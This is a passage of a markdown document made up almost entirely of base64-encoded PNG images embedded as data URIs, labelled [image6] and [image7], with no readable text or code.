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>

[image6]: <data:image/png;base64,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>

[image7]: <data:image/png;base64,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